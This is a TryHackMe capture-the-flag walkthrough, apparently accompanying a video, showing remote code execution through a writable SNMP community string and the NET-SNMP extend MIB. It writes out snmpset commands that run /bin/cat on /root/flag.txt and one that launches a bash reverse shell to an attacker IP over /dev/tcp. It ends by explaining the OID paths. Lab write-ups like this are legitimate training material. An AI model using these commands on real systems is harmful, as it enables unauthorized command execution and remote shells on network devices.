## TryHackMe room Operation Takeover [https://tryhackme.com/room/operationtakeover)

### TryHackMe peration Takeover YouTube Video Walk Through: 

[TryHackMe Operation Takeover | SNMP RCE via NET-SNMP Extend | Full Walkthrough 2026](https://youtu.be/yqBROBit7B0)

**Below commands used on TryHackMe room Operation Takeover YouTube video walk through:**

```
snmpset -v2c -c pr1v4t3 10.129.153.16 .1.3.6.1.2.1.1.5.0 s "CompromisedDevice"
snmpget -v2c -c pr1v4t3 10.129.153.16 .1.3.6.1.2.1.1.5.0
snmpwalk -v2c -c pr1v4t3 10.129.153.16 .1.3.6.1.2.1.1.5.0
```

```
c = 99
a = 97
t = 116
```

### Read the flag

```
snmpset -v2c -c pr1v4t3 10.129.153.16 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.99.97.116' i 4 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.99.97.116' s "/bin/cat" \
  '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.99.97.116' s "/root/flag.txt"
```

```
snmpwalk -v2c -c pr1v4t3 10.129.185.152 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116
```

### Read firt 6 characters of the flag
  
```
h = 104
e = 101
a = 97
```

```
snmpset -v2c -c pr1v4t3 10.129.153.16 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.104.101.97' i 4 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.104.101.97' s "/bin/head -c6" \
  '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.104.101.97' s "/root/flag.txt"
```

```  
snmpwalk -v2c -c pr1v4t3 10.129.153.16 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.104.101.97
```

### Rever Shell
  
```
r = 114
e = 101
v = 118
```

```
snmpset -v2c -c pr1v4t3 10.129.185.152 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.114.101.118' i 4 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.114.101.118' s "/bin/bash" \
  '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.114.101.118' s "-c 'bash -i >& /dev/tcp/10.129.90.34/4444 0>&1'"
```

``` 
snmpwalk -v2c -c pr1v4t3 10.129.153.16 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.114.101.118
```

.1.3.6.1.2.1.1.5.0 translates into the tree structure:

    .1 = iso (The Root)

    .3 = org (Organizations)

    .6 = dod (Department of Defense)

    .1 = internet

    .2 = mgmt (Management)

    .1 = mib-2 (Standard Network Management)

    .1 = system (The System Info folder)

    .5 = sysName (The specific file that holds the device's hostname)

    .0 = The exact instance of that name.
    
===
### The Base Path: 1.3.6.1.4.1.8072.1.3.2

**When we realized we had Write access (snmpset), we targeted a very specific branch of the SNMP tree called the NET-SNMP-EXTEND-MIB. This specific branch exists to allow administrators to run custom shell scripts and read their output via SNMP.

    The OID for this specific branch is 1.3.6.1.4.1.8072.1.3.2.

### The "Action" Codes

**Inside that branch, there are specific sub-folders for different actions:

    .2.1.21 (nsExtendStatus): Tells SNMP to create a new script entry or destroy an old one. Setting this to 4 (createAndGo) creates the entry.

    .2.1.2 (nsExtendCommand): Tells SNMP what binary to run (e.g., /bin/bash or /bin/cat).

    .2.1.3 (nsExtendArgs): Tells SNMP the arguments to pass to that binary (e.g., your reverse shell payload).
